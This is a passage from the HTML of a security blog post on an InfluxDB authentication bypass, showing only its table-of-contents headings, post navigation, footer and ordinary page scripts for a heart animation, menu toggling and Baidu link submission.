class="toc-item toc-level-4"><a class="toc-link" href="#如何生成JWT"><span class="toc-text">如何生成JWT</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Influxdb认证绕过漏洞"><span class="toc-text">0x02 Influxdb认证绕过漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#影响版本"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理及代码审计"><span class="toc-text">漏洞原理及代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#信息搜集"><span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#构造PoC"><span class="toc-text">构造PoC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#补丁分析"><span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案"><span class="toc-text">修复方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-text">0x03 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/12/07/Java-AMF3反序列化漏洞/" rel="next" title="Java AMF3反序列化漏洞">
+          Java AMF3反序列化漏洞
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2020/01/04/浅析XSSI漏洞/" rel="prev" title="浅析XSSI漏洞">
+            浅析XSSI漏洞
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
